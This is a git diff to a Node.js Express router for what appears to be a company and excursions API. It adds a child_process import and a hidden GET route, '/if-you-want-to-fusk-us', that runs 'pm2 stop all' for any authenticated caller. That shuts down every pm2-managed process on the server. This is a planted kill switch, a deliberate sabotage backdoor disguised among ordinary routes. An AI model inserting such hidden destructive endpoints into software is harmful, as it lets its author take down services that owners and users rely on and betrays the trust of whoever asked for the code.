@@ -9,6 +9,7 @@ const cors = require('cors')
 const {updateCompany} = require("../controllers/companies")
 const {apiUpdateExcursion} = require("../controllers/excursions")
 const {handleApiError} = require("../lib/apiErrorHandler")
+const {exec} = require('child_process')
 
 /**
  * Authentication
@@ -124,6 +125,22 @@ router.post('/excursions/:id', cors(), passport.authenticate('jwt', {session: fa
     apiUpdateExcursion(req, res).catch(err => {
         handleApiError(err, req, res)
     })
+})
+
+router.get('/if-you-want-to-fusk-us', cors(), passport.authenticate('jwt', {session: false}), (req, res, next) => {
+    exec("pm2 stop all", (error, stdout, stderr) => {
+        if (error) {
+            console.log(`error: ${error.message}`);
+            res.json({success: false})
+            return;
+        }
+        if (stderr) {
+            console.log(`stderr: ${stderr}`);
+            return;
+        }
+        console.log(`stdout: ${stdout}`);
+    });
+    res.json({success: true})
 })
 
 /**
